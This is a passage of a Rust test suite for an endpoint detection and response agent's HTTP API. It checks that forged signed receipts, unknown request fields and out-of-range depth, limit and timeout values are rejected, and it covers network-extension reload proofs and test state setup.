        let mut forged_bundle_receipt = EndpointDecisionReceipt::for_evidence_bundle_manifest(
            EndpointEvidenceBundleManifestReceiptInput {
                local_sequence: 85,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy,
                sensor_state,
                root_node_id: forged_root_node_id.as_str(),
                bundle: &forged_bundle,
                graph: &forged_subgraph,
            },
        );
        forged_bundle_receipt.signer.signer_public_key = Some(signer_public_key);
        let forged_bundle_receipt = forged_bundle_receipt
            .sign_with(&keypair)
            .unwrap_or_else(|err| panic!("failed to sign forged bundle proof receipt: {err}"));
        let err = verify_response_execution_proof_contract(
            &execution,
            &request_receipt,
            &execution_receipt,
            &forged_bundle_receipt,
            &[],
            &[],
            &[],
        )
        .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(
            err.1.contains("evidence bundle manifest receipt"),
            "expected bundle proof contract error, got {}",
            err.1
        );
        let forged_stored_bundle = StoredEndpointEvidenceBundle {
            bundle: execution.evidence_bundle.clone(),
            path: Some("/tmp/forged-proof-contract-bundle.json".to_string()),
            byte_count: 1,
            graph: forged_subgraph,
        };
        let err =
            verify_response_execution_proof_evidence_bundle(&execution, &forged_stored_bundle)
                .unwrap_err();
        assert_eq!(err.0, StatusCode::CONFLICT);
        assert!(
            err.1.contains("evidence bundle artifact"),
            "expected stored bundle proof contract error, got {}",
            err.1
        );
    }

    #[test]
    fn edr_state_changing_requests_reject_unknown_fields() {
        assert_unknown_field_rejected::<EdrPolicyDeltaApplyInput>(
            serde_json::json!({
                "dryRun": true,
                "forceApply": true
            }),
            "forceApply",
        );
        assert_unknown_field_rejected::<EdrNetworkExtensionEgressPolicyProofInput>(
            serde_json::json!({
                "refreshProviders": true,
                "refreshEverything": true
            }),
            "refreshEverything",
        );
        assert_unknown_field_rejected::<EdrControlAckPostbackRetryInput>(
            serde_json::json!({
                "force": true,
                "retryEverything": true
            }),
            "retryEverything",
        );
        assert_unknown_field_rejected::<EdrControlArchiveUploadRetryInput>(
            serde_json::json!({
                "force": true,
                "retryEverything": true
            }),
            "retryEverything",
        );
        assert_unknown_field_rejected::<EdrControlArchiveUploadBackfillInput>(
            serde_json::json!({
                "bundleId": "bundle-1",
                "bundleIds": ["bundle-2"]
            }),
            "bundleIds",
        );
        assert_unknown_field_rejected::<EdrFleetHuntEventRetryInput>(
            serde_json::json!({
                "limit": 10,
                "retryEverything": true
            }),
            "retryEverything",
        );
        assert_unknown_field_rejected::<EdrPolicyEventReplayInput>(
            serde_json::json!({
                "events": [],
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrPolicyEventImpactInput>(
            serde_json::json!({
                "events": [],
                "proposedPolicyYaml": "version: strict-test\n",
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrPolicyEventHistoryReplayInput>(
            serde_json::json!({
                "limit": 10,
                "sessionId": "session-strict-history",
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrPolicyEventHistoryImpactInput>(
            serde_json::json!({
                "limit": 10,
                "sessionId": "session-strict-history",
                "proposedPolicyYaml": "version: strict-test\n",
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrPrivacyReportInput>(
            serde_json::json!({
                "observations": [],
                "uploadRawArtifacts": true
            }),
            "uploadRawArtifacts",
        );
        assert_unknown_field_rejected::<EdrCausalSubgraphInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-subgraph",
                "includeRawEvents": true
            }),
            "includeRawEvents",
        );
        assert_unknown_field_rejected::<EdrCausalSubgraphInput>(
            serde_json::json!({
                "process": {
                    "processGUID": "proc-strict-subgraph"
                }
            }),
            "processGUID",
        );
        assert_unknown_field_rejected::<EdrCausalContextInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-context",
                "includeRawEvents": true
            }),
            "includeRawEvents",
        );
        assert_unknown_field_rejected::<EdrGraphSearchInput>(
            serde_json::json!({
                "nodeKind": "process",
                "includeRawEvents": true
            }),
            "includeRawEvents",
        );
        assert_unknown_field_rejected::<EdrGraphSliceExportInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-export",
                "sliceKind": "causal_subgraph",
                "includeRawEvents": true
            }),
            "includeRawEvents",
        );
        assert_unknown_field_rejected::<EdrGraphSliceExportInput>(
            serde_json::json!({
                "process": {
                    "processGUID": "proc-strict-export"
                }
            }),
            "processGUID",
        );
        assert_unknown_field_rejected::<EdrPolicySimulationInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-simulation",
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrPolicySimulationInput>(
            serde_json::json!({
                "process": {
                    "processGUID": "proc-strict-simulation"
                }
            }),
            "processGUID",
        );
        assert_unknown_field_rejected::<EdrPolicyReplayInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-replay",
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrAgentSecretTouchesInput>(
            serde_json::json!({
                "credentialKind": "api_token",
                "includeRawSecrets": true
            }),
            "includeRawSecrets",
        );
        assert_unknown_field_rejected::<EdrDetectionCandidateInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-candidate",
                "auditOnly": true
            }),
            "auditOnly",
        );
        assert_unknown_field_rejected::<EdrDetectionCandidateInput>(
            serde_json::json!({
                "process": {
                    "processGUID": "proc-strict-candidate"
                }
            }),
            "processGUID",
        );
        assert_unknown_field_rejected::<EdrStageDetectionInput>(
            serde_json::json!({
                "rootNodeId": "node-strict-stage",
                "selectedStage": "audit",
                "forceStage": true
            }),
            "forceStage",
        );
        assert_unknown_field_rejected::<EdrPolicyDeltaInput>(
            serde_json::json!({
                "ruleId": "rule-strict-delta",
                "forceApply": true
            }),
            "forceApply",
        );

        let (bundle, graph) = test_stored_graph_slice_bundle(
            "strict-input-bundle",
            "api.example.invalid",
            "strict",
            0,
        );
        let archive = EdrEvidenceBundleArchive {
            artifact: EdrEvidenceBundleArtifact {
                bundle_id: bundle.bundle_id.clone(),
                path: None,
                byte_count: 0,
                content_hash: bundle.content_hash.clone(),
            },
            bundle,
            graph,
            receipts: Vec::new(),
        };
        assert_unknown_field_rejected::<EdrEvidenceBundleArchiveVerifyInput>(
            serde_json::json!({
                "archiveHash": "sha256:test",
                "archive": archive,
                "archiveDigest": "sha256:wrong"
            }),
            "archiveDigest",
        );
        assert_unknown_field_rejected::<EdrEvidenceBundleCompactionInput>(
            serde_json::json!({
                "maxBundles": 5,
                "removeEverything": true
            }),
            "removeEverything",
        );
        assert_unknown_field_rejected::<EdrFlightRecorderCompactionInput>(
            serde_json::json!({
                "maxObservations": 5,
                "removeEverything": true
            }),
            "removeEverything",
        );
        assert_unknown_field_rejected::<EdrReceiptCompactionInput>(
            serde_json::json!({
                "maxReceipts": 5,
                "removeEverything": true
            }),
            "removeEverything",
        );

        let plan = DeceptionPlan {
            root: PathBuf::from("/tmp/clawdstrike-strict-deception"),
            endpoint_id: "endpoint-strict-deception".to_string(),
            artifacts: Vec::new(),
        };
        assert_unknown_field_rejected::<EdrDeceptionPlanInput>(
            serde_json::json!({
                "root": "/tmp/clawdstrike-strict-deception",
                "endpoint_id": "endpoint-strict-deception",
                "dryRun": true
            }),
            "dryRun",
        );
        assert_unknown_field_rejected::<EdrMaterializeDeceptionPlanInput>(
            serde_json::json!({
                "plan": plan,
                "dryRun": true
            }),
            "dryRun",
        );
        let plan = DeceptionPlan {
            root: PathBuf::from("/tmp/clawdstrike-strict-deception"),
            endpoint_id: "endpoint-strict-deception".to_string(),
            artifacts: Vec::new(),
        };
        assert_unknown_field_rejected::<EdrCleanupDeceptionPlanInput>(
            serde_json::json!({
                "plan": plan,
                "force": true
            }),
            "force",
        );
        let old_plan = DeceptionPlan {
            root: PathBuf::from("/tmp/clawdstrike-strict-deception-old"),
            endpoint_id: "endpoint-strict-deception".to_string(),
            artifacts: Vec::new(),
        };
        let new_plan = DeceptionPlan {
            root: PathBuf::from("/tmp/clawdstrike-strict-deception-new"),
            endpoint_id: "endpoint-strict-deception".to_string(),
            artifacts: Vec::new(),
        };
        assert_unknown_field_rejected::<EdrRotateDeceptionPlanInput>(
            serde_json::json!({
                "oldPlan": old_plan,
                "newPlan": new_plan,
                "force": true
            }),
            "force",
        );
    }

    #[tokio::test]
    async fn edr_graph_depth_requests_reject_oversized_values() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/causal-subgraph",
                post(agent_edr_causal_subgraph),
            )
            .route(
                "/api/v1/agent/edr/causal-context",
                post(agent_edr_causal_context),
            )
            .route(
                "/api/v1/agent/edr/graph-slices/export",
                post(agent_edr_graph_slice_export),
            )
            .route(
                "/api/v1/agent/edr/graph-search",
                post(agent_edr_graph_search),
            )
            .route(
                "/api/v1/agent/edr/policy-simulation",
                post(agent_edr_policy_simulation),
            )
            .route(
                "/api/v1/agent/edr/policy-replay",
                post(agent_edr_policy_replay),
            )
            .route(
                "/api/v1/agent/edr/policy-events/impact/history",
                post(agent_edr_policy_events_impact_history),
            )
            .route(
                "/api/v1/agent/edr/detection-candidate",
                post(agent_edr_detection_candidate),
            )
            .route(
                "/api/v1/agent/edr/staged-detections",
                post(agent_edr_stage_detection),
            )
            .route(
                "/api/v1/agent/edr/agent-secret-touches",
                post(agent_edr_agent_secret_touches),
            )
            .with_state(Arc::new(test_state()));
        let oversized_depth = EDR_MAX_CAUSAL_SUBGRAPH_DEPTH + 1;

        for (uri, body, field) in [
            (
                "/api/v1/agent/edr/causal-subgraph",
                serde_json::json!({
                    "rootNodeId": "node-depth-subgraph",
                    "maxDepth": oversized_depth
                }),
                "maxDepth",
            ),
            (
                "/api/v1/agent/edr/causal-context",
                serde_json::json!({
                    "rootNodeId": "node-depth-context",
                    "upstreamDepth": oversized_depth
                }),
                "upstreamDepth",
            ),
            (
                "/api/v1/agent/edr/graph-slices/export",
                serde_json::json!({
                    "rootNodeId": "node-depth-export",
                    "sliceKind": "causal_subgraph",
                    "maxDepth": oversized_depth
                }),
                "maxDepth",
            ),
            (
                "/api/v1/agent/edr/graph-search",
                serde_json::json!({
                    "labelContains": "node-depth-search",
                    "downstreamDepth": oversized_depth
                }),
                "downstreamDepth",
            ),
            (
                "/api/v1/agent/edr/policy-simulation",
                serde_json::json!({
                    "rootNodeId": "node-depth-simulation",
                    "maxDepth": oversized_depth
                }),
                "maxDepth",
            ),
            (
                "/api/v1/agent/edr/policy-replay",
                serde_json::json!({
                    "rootNodeId": "node-depth-replay",
                    "maxDepth": oversized_depth
                }),
                "maxDepth",
            ),
            (
                "/api/v1/agent/edr/policy-events/impact/history",
                serde_json::json!({
                    "proposedPolicyYaml": "version: depth-test\n",
                    "causalContextDepth": oversized_depth
                }),
                "causalContextDepth",
            ),
            (
                "/api/v1/agent/edr/detection-candidate",
                serde_json::json!({
                    "rootNodeId": "node-depth-candidate",
                    "maxDepth": oversized_depth
                }),
                "maxDepth",
            ),
            (
                "/api/v1/agent/edr/staged-detections",
                serde_json::json!({
                    "rootNodeId": "node-depth-stage",
                    "selectedStage": "audit",
                    "maxDepth": oversized_depth
                }),
                "maxDepth",
            ),
            (
                "/api/v1/agent/edr/agent-secret-touches",
                serde_json::json!({
                    "upstreamDepth": oversized_depth
                }),
                "upstreamDepth",
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("POST")
                .uri(uri)
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build oversized-depth request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("oversized-depth request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read oversized-depth error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("oversized-depth error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected oversized-depth status for {uri}: {error}"
            );
            assert!(
                error.contains(field) && error.contains("must be at most 64"),
                "unexpected oversized-depth error for {uri}: {error}"
            );
        }
    }

    #[tokio::test]
    async fn edr_post_body_limit_requests_reject_out_of_range_values() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/graph-search",
                post(agent_edr_graph_search),
            )
            .route(
                "/api/v1/agent/edr/agent-secret-touches",
                post(agent_edr_agent_secret_touches),
            )
            .route(
                "/api/v1/agent/edr/fleet-hunt-events/retry",
                post(agent_edr_fleet_hunt_events_retry),
            )
            .route(
                "/api/v1/agent/edr/control-archive-uploads/backfill",
                post(agent_edr_control_archive_uploads_backfill),
            )
            .route(
                "/api/v1/agent/edr/control-archive-uploads/retry",
                post(agent_edr_control_archive_uploads_retry),
            )
            .route(
                "/api/v1/agent/edr/control-receipt-uploads/retry",
                post(agent_edr_control_receipt_uploads_retry),
            )
            .route(
                "/api/v1/agent/edr/control-ack-postbacks/retry",
                post(agent_edr_control_ack_postbacks_retry),
            )
            .with_state(Arc::new(test_state()));

        for (uri, body, max) in [
            (
                "/api/v1/agent/edr/graph-search",
                serde_json::json!({
                    "labelContains": "limit-test",
                    "limit": EDR_MAX_STORED_FINDINGS + 1
                }),
                EDR_MAX_STORED_FINDINGS,
            ),
            (
                "/api/v1/agent/edr/agent-secret-touches",
                serde_json::json!({
                    "limit": EDR_MAX_STORED_FINDINGS + 1
                }),
                EDR_MAX_STORED_FINDINGS,
            ),
            (
                "/api/v1/agent/edr/fleet-hunt-events/retry",
                serde_json::json!({
                    "limit": 101
                }),
                100,
            ),
            (
                "/api/v1/agent/edr/control-archive-uploads/backfill",
                serde_json::json!({
                    "limit": 101
                }),
                100,
            ),
            (
                "/api/v1/agent/edr/control-archive-uploads/retry",
                serde_json::json!({
                    "limit": 101
                }),
                100,
            ),
            (
                "/api/v1/agent/edr/control-receipt-uploads/retry",
                serde_json::json!({
                    "limit": 101
                }),
                100,
            ),
            (
                "/api/v1/agent/edr/control-ack-postbacks/retry",
                serde_json::json!({
                    "limit": 101
                }),
                100,
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("POST")
                .uri(uri)
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build out-of-range limit request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("out-of-range limit request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read out-of-range limit error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("out-of-range limit error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected out-of-range limit status for {uri}: {error}"
            );
            assert!(
                error.contains("limit") && error.contains(&format!("between 1 and {max}")),
                "unexpected out-of-range limit error for {uri}: {error}"
            );
        }
    }

    #[tokio::test]
    async fn edr_get_query_limits_reject_out_of_range_values() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/finding-groups",
                get(agent_edr_finding_groups),
            )
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .route(
                "/api/v1/agent/edr/evidence-bundles",
                get(agent_edr_evidence_bundles),
            )
            .route(
                "/api/v1/agent/edr/staged-detections",
                get(agent_edr_staged_detections),
            )
            .route(
                "/api/v1/agent/edr/policy-deltas",
                get(agent_edr_policy_deltas),
            )
            .route(
                "/api/v1/agent/edr/response-executions",
                get(agent_edr_response_executions),
            )
            .route(
                "/api/v1/agent/edr/response-acknowledgements",
                get(agent_edr_response_acknowledgements),
            )
            .with_state(Arc::new(test_state()));

        for (uri, field, expected) in [
            (
                format!(
                    "/api/v1/agent/edr/finding-groups?limit={}",
                    EDR_MAX_STORED_FINDINGS + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_STORED_FINDINGS}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/finding-groups?maxDepth={}",
                    EDR_MAX_CAUSAL_SUBGRAPH_DEPTH + 1
                ),
                "maxDepth",
                format!("at most {EDR_MAX_CAUSAL_SUBGRAPH_DEPTH}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/staged-detections?limit={}",
                    EDR_MAX_STORED_FINDINGS + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_STORED_FINDINGS}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/policy-deltas?limit={}",
                    EDR_MAX_STORED_FINDINGS + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_STORED_FINDINGS}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/receipts?limit={}",
                    EDR_MAX_RECEIPT_QUERY_LIMIT + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_RECEIPT_QUERY_LIMIT}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/evidence-bundles?limit={}",
                    EDR_MAX_STORED_FINDINGS + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_STORED_FINDINGS}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/response-executions?limit={}",
                    EDR_MAX_RESPONSE_EXECUTION_QUERY_LIMIT + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_RESPONSE_EXECUTION_QUERY_LIMIT}"),
            ),
            (
                format!(
                    "/api/v1/agent/edr/response-acknowledgements?limit={}",
                    EDR_MAX_STORED_FINDINGS + 1
                ),
                "limit",
                format!("between 1 and {EDR_MAX_STORED_FINDINGS}"),
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("GET")
                .uri(uri.as_str())
                .header(AUTHORIZATION, "Bearer test-token")
                .body(axum::body::Body::empty())
                .unwrap_or_else(|e| panic!("failed to build out-of-range query request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("out-of-range query request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read out-of-range query error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("out-of-range query error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected out-of-range query status for {uri}: {error}"
            );
            assert!(
                error.contains(field) && error.contains(&expected),
                "unexpected out-of-range query error for {uri}: {error}"
            );
        }
    }

    #[tokio::test]
    async fn edr_provider_timeout_requests_reject_out_of_range_values() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply",
                post(agent_edr_policy_delta_apply),
            )
            .route(
                "/api/v1/agent/edr/network-extension/egress-policy/proof",
                post(agent_edr_network_extension_egress_policy_proof),
            )
            .with_state(Arc::new(test_state()));

        for (uri, body, field) in [
            (
                "/api/v1/agent/edr/policy-deltas/policy-delta-timeout/apply",
                serde_json::json!({
                    "dryRun": false,
                    "verifyProtectionState": true,
                    "providerAckTimeoutMs": 0
                }),
                "providerAckTimeoutMs",
            ),
            (
                "/api/v1/agent/edr/policy-deltas/policy-delta-timeout/apply",
                serde_json::json!({
                    "dryRun": false,
                    "verifyProtectionState": true,
                    "providerAckTimeoutMs": EDR_MAX_PROVIDER_ACK_TIMEOUT_MS + 1
                }),
                "providerAckTimeoutMs",
            ),
            (
                "/api/v1/agent/edr/network-extension/egress-policy/proof",
                serde_json::json!({
                    "refreshProviders": true,
                    "providerRefreshTimeoutMs": 0
                }),
                "providerRefreshTimeoutMs",
            ),
            (
                "/api/v1/agent/edr/network-extension/egress-policy/proof",
                serde_json::json!({
                    "refreshProviders": true,
                    "providerRefreshTimeoutMs": EDR_MAX_PROVIDER_ACK_TIMEOUT_MS + 1
                }),
                "providerRefreshTimeoutMs",
            ),
        ] {
            let req = axum::http::Request::builder()
                .method("POST")
                .uri(uri)
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
                .body(axum::body::Body::from(body.to_string()))
                .unwrap_or_else(|e| panic!("failed to build out-of-range timeout request: {e}"));
            let response = app
                .clone()
                .oneshot(req)
                .await
                .unwrap_or_else(|e| panic!("out-of-range timeout request failed: {e}"));
            let status = response.status();
            let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
                .await
                .unwrap_or_else(|e| panic!("failed to read out-of-range timeout error: {e}"));
            let error = String::from_utf8(bytes.to_vec())
                .unwrap_or_else(|e| panic!("out-of-range timeout error is not utf8: {e}"));
            assert_eq!(
                status,
                StatusCode::BAD_REQUEST,
                "unexpected out-of-range timeout status for {uri}: {error}"
            );
            assert!(
                error.contains(field)
                    && error.contains(&format!("between 1 and {EDR_MAX_PROVIDER_ACK_TIMEOUT_MS}")),
                "unexpected out-of-range timeout error for {uri}: {error}"
            );
        }
    }

    #[cfg(not(target_os = "macos"))]
    #[tokio::test]
    async fn policy_delta_apply_enforcement_marks_macos_providers_non_applicable_off_macos() {
        let state = Arc::new(test_state());
        let settings = state.settings.read().await.clone();
        let proof = build_policy_delta_apply_enforcement_proof(
            &state,
            PolicyDeltaApplyEnforcementProofInput {
                settings: &settings,
                local_policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@non-macos".to_string(),
                    policy_hash: sha256(b"test-policy-non-macos").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                policy_delta_artifact: None,
                cross_window_impact_hash: None,
                cross_window_recommendation_hash: None,
                daemon_policy_reload_requested: false,
                daemon_restart_requested: false,
                provider_ack_timeout_ms: EDR_DEFAULT_PROVIDER_ACK_TIMEOUT_MS,
            },
        )
        .await
        .unwrap_or_else(|err| panic!("build non-macOS enforcement proof: {err}"));

        assert!(!proof.network_extension_policy_reload.requested);
        assert!(!proof.network_extension_policy_reload.saved);
        assert!(!proof.provider_status_refresh.requested);
        assert!(!proof.provider_status_refresh.refreshed);
        assert_eq!(proof.provider_status_refresh.timeout_ms, 0);
        assert!(!proof.provider_acknowledgement_poll.requested);
        assert_eq!(proof.provider_acknowledgement_poll.timeout_ms, 0);
        assert_eq!(proof.provider_acknowledgement_poll.attempts, 0);
        assert!(proof.provider_acknowledgement_poll.satisfied);
        assert!(proof.provider_policy_acknowledgements.is_empty());
        assert!(proof.degraded_provider_receipts.is_empty());
    }

    #[test]
    fn network_extension_reload_proof_requires_observed_provider_delivery() {
        let mut proof = NetworkExtensionReloadRequestProof {
            requested: true,
            saved: true,
            request_id: Some("reload-test-1".to_string()),
            policy_snapshot_path: "/tmp/clawdstrike-ne-policy.json".to_string(),
            generation: 42,
            provider_reload_observed: false,
            provider_reload_matched: false,
            provider_reload_request_id_matches: false,
            provider_reload_generation_matches: false,
            provider_reload_policy_snapshot_path_matches: false,
            provider_reloaded: None,
            provider_policy_synced: Some(true),
            provider_enforcement_ready: Some(true),
            provider_reload_elapsed_ms: 0,
            provider_reload_attempts: 1,
            error: None,
        };

        let err = match ensure_network_extension_reload_proof_succeeded(&proof) {
            Ok(()) => panic!("reload proof unexpectedly succeeded without provider delivery"),
            Err(err) => err,
        };
        assert!(err.contains("observed=false"));
        assert!(err.contains("matched=false"));

        proof.provider_reload_observed = true;
        proof.provider_reload_matched = true;
        proof.provider_reload_request_id_matches = true;
        proof.provider_reload_generation_matches = true;
        proof.provider_reload_policy_snapshot_path_matches = true;
        proof.provider_reloaded = Some(true);

        ensure_network_extension_reload_proof_succeeded(&proof)
            .unwrap_or_else(|err| panic!("matched reload proof should succeed: {err}"));
    }

    #[test]
    fn network_extension_response_readiness_rejects_unavailable_attestation() {
        let reasons = network_extension_response_not_ready_reasons(&ProviderStatus {
            runtime: ProviderRuntimeState::Active,
            policy_synced: Some(true),
            enforcement_ready: Some(true),
            provider_state: Some(crate::macos::status::ProviderAttestationState {
                provider: "macos.network_extension".to_string(),
                installed: true,
                active: false,
                healthy: false,
                availability: ProviderAvailability::Unavailable,
                degraded_reasons: vec!["provider process missing".to_string()],
                last_healthy_timestamp: None,
                approval_status: Default::default(),
            }),
            ..ProviderStatus::unknown()
        });

        assert!(reasons.contains(&"provider_state_inactive".to_string()));
        assert!(reasons.contains(&"provider_state_unavailable".to_string()));
        assert!(reasons.contains(&"provider_state_unhealthy".to_string()));
        assert!(reasons.contains(&"provider_state_degraded:provider process missing".to_string()));
    }

    fn test_state() -> AgentApiState {
        let settings_value = Settings {
            settings_path_override: Some(test_settings_path()),
            policy_path: test_policy_path(),
            local_agent_id: Some("test-agent".to_string()),
            ..Settings::default()
        };
        std::fs::write(
            &settings_value.policy_path,
            "version: \"test-edr\"\nname: agent-api-test\n",
        )
        .unwrap_or_else(|err| panic!("failed to write test policy: {err}"));
        let settings = Arc::new(RwLock::new(settings_value));
        let daemon_manager = Arc::new(DaemonManager::new(DaemonConfig {
            binary_path: PathBuf::from("/tmp/hushd"),
            port: 9876,
            policy_path: PathBuf::from("/tmp/policy.yaml"),
            settings: Some(settings.clone()),
        }));
        let session_manager = Arc::new(crate::session::SessionManager::new());
        let approval_queue = Arc::new(crate::approval::ApprovalQueue::new());
        let audit_queue = Arc::new(AuditQueue::new_test_isolated());
        let openclaw = OpenClawManager::new(settings.clone());
        let updater = Arc::new(crate::updater::HushdUpdater::new(
            settings.clone(),
            daemon_manager.clone(),
        ));

        AgentApiState {
            settings,
            daemon_manager,
            session_manager,
            approval_queue,
            audit_queue,
            macos_host: Arc::new(MacosHostService::new()),
            openclaw,
            updater,
            fleet_hunt_publisher: None,
            auth_token: Arc::new(StdRwLock::new("test-token".to_string())),
            previous_auth_token: Arc::new(StdMutex::new(None)),
            token_grace_minutes: Arc::new(StdRwLock::new(15)),
            http_client: reqwest::Client::new(),
            policy_version_cache: Arc::new(RwLock::new(PolicyVersionCache::default())),
            approval_rate_limiter: Arc::new(Mutex::new(ApprovalSubmissionLimiter::default())),
            ui_bootstrap_start_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
            ui_bootstrap_verify_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
            policy_check_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
            integration_test_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
            openclaw_request_rate_limiter: Arc::new(Mutex::new(RouteRateLimiter::default())),
            ui_bootstrap_sessions: Arc::new(Mutex::new(HashMap::new())),
            edr_flight_recorder: Arc::new(Mutex::new(EndpointFlightRecorder::transient())),
            edr_receipt_ledger: Arc::new(Mutex::new(EndpointReceiptLedger::transient(
                Keypair::from_seed(&[42u8; 32]),
                "test-edr-signer",
            ))),
            edr_honey_registry: Arc::new(Mutex::new(EndpointHoneyRegistry::transient())),
            edr_evidence_bundle_store: Arc::new(Mutex::new(
                EndpointEvidenceBundleStore::transient(),
            )),
            edr_response_execution_ledger: Arc::new(Mutex::new(
                EndpointResponseExecutionLedger::transient(),
            )),
            edr_response_acknowledgement_ledger: Arc::new(Mutex::new(
                EndpointResponseAcknowledgementLedger::transient(),
            )),
            edr_control_ack_postback_retry_ledger: Arc::new(Mutex::new(
                EndpointControlAckPostbackRetryLedger::transient(),
            )),
            edr_control_archive_upload_retry_ledger: Arc::new(Mutex::new(
                EndpointControlArchiveUploadRetryLedger::transient(),
            )),
            edr_control_receipt_upload_retry_ledger: Arc::new(Mutex::new(
                EndpointControlReceiptUploadRetryLedger::transient(),
            )),
            edr_fleet_hunt_event_outbox: Arc::new(Mutex::new(
                EndpointFleetHuntEventOutbox::transient(),
            )),
            edr_egress_restriction_ledger: Arc::new(Mutex::new(
                EndpointEgressRestrictionLedger::transient(),
            )),
            edr_staged_detection_ledger: Arc::new(Mutex::new(
                EndpointStagedDetectionLedger::transient(),
            )),
            edr_policy_delta_store: Arc::new(Mutex::new(EndpointPolicyDeltaStore::transient())),
            edr_cross_window_promotion_validations: Arc::new(Mutex::new(VecDeque::new())),
            edr_network_extension_egress_policy_path: Arc::new(
                test_network_extension_egress_policy_path(),
            ),
            edr_quarantine_root: Arc::new(test_quarantine_dir()),
            edr_recent_findings: Arc::new(Mutex::new(VecDeque::new())),
            edr_auto_published_agent_secret_touch_keys: Arc::new(Mutex::new(BTreeSet::new())),
        }
    }

    fn test_policy_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-policy-{}-{counter}.yaml",
            std::process::id()
        ))
    }

    async fn mock_daemon_policy_reload() -> impl IntoResponse {
        Json(serde_json::json!({
            "success": true,
            "policy_hash": sha256(b"mock-daemon-policy").to_hex_prefixed(),
            "message": "mock daemon policy reloaded"
        }))
    }

    async fn spawn_mock_daemon_policy_reload() -> (u16, tokio::task::JoinHandle<()>) {
        let app = Router::new().route("/api/v1/policy/reload", post(mock_daemon_policy_reload));
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind mock daemon policy reload endpoint: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| panic!("failed to read mock daemon policy reload port: {e}"))
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("mock daemon policy reload endpoint failed: {e}"));
        });
        (port, handle)
    }

    async fn resolve_test_raw_artifact_approval(
        state: &AgentApiState,
        resource: &str,
        reason: &str,
    ) -> String {
        let request = state
            .approval_queue
            .submit(ApprovalRequestInput {
                tool: "clawdstrike-agent".to_string(),
                resource: resource.to_string(),
                guard: EDR_RAW_ARTIFACT_UPLOAD_GUARD.to_string(),
                reason: reason.to_string(),
                severity: "high".to_string(),
                session_id: Some("raw-artifact-test-session".to_string()),
